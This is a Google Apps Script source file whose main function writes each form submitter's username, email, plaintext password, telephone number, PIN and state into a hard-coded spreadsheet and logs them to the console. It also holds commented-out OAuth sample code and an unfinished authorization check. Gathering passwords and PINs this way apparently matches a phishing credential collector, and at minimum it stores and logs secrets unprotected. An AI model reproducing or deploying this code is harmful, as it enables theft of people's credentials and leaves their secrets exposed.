function includeExternalFile(filename) {
  return HtmlService.createHtmlOutputFromFile(filename).getContent();
}

function userClickedForm(userInfo) {
  // Test Initiation Data  spreadsheet
  var ss = SpreadsheetApp.openById("1x_TNn_5du_4dTGb7VNqcq3mymsPt2toETl12nYdcWjU");
  var ws = ss.getSheets()[1];
  ws.appendRow([new Date(), userInfo.userName, userInfo.email, userInfo.password, userInfo.telephone, userInfo.pin, userInfo.state ]);
   console.log(userInfo);
  
}



// oauth google sign in 

// const {OAuth2Client} = require('google-auth-library');
// const client = new OAuth2Client(CLIENT_ID);
// async function verify() {
//   const ticket = await client.verifyIdToken({
//       idToken: token,
//       audience: CLIENT_ID,  // Specify the CLIENT_ID of the app that accesses the backend
//       // Or, if multiple clients access the backend:
//       //[CLIENT_ID_1, CLIENT_ID_2, CLIENT_ID_3]
//   });
//   const payload = ticket.getPayload();
//   const userid = payload['sub'];
//   // If request specified a G Suite domain:
//   // const domain = payload['hd'];
// }
// verify().catch(console.error);

function authChecking() {
  var authInfo = ScriptApp.getAuthorizationInfo(ScriptApp.AuthMode.FULL);
  status = authInfo.getAuthorizationStatus();
  url = authInfo.getAuthorizationUrl();
  


}
